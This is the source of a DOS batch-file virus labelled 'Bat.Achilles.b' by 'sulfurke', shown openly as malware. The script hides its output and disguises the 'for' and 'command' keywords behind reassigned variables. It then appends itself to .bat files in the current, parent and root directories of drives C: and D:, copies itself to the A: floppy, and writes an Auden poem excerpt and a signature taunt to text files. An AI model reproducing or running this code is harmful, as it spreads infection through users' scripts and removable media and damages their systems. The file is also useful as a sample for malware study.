REM Bat.Achilles.b
REM by sulfurke
cls 
@echo off
ctty nul
set ana=alfa
set ana=beta
set ana=for
set corn=greek
set corn=achilles
set corn=%0
set rand=Thetis
set rand=Peleus
set rand=command
%ana% %%v in (*.bat ../*.bat ../../*.bat c:\*.bat d:\*.bat) do copy %%v + %corn%
%rand% /f /c copy %0 A:\
echo      She looked over his shoulder > a:\achilles.txt
echo       For vines and olive trees, >> a:\achilles.txt
echo      Marble well-governed cities >> a:\achilles.txt
echo       And ships upon untamed seas, >> a:\achilles.txt
echo      But there on the shining metal >> a:\achilles.txt
echo        His hands had put instead >> a:\achilles.txt
echo      An artificial wilderness >> a:\achilles.txt
echo        And a sky like lead. >> a:\achilles.txt
echo   >> a:\achilles.txt
echo ... and so ever man had an achilles' heel [Sulfurke] >> c:\achilles.txt
:end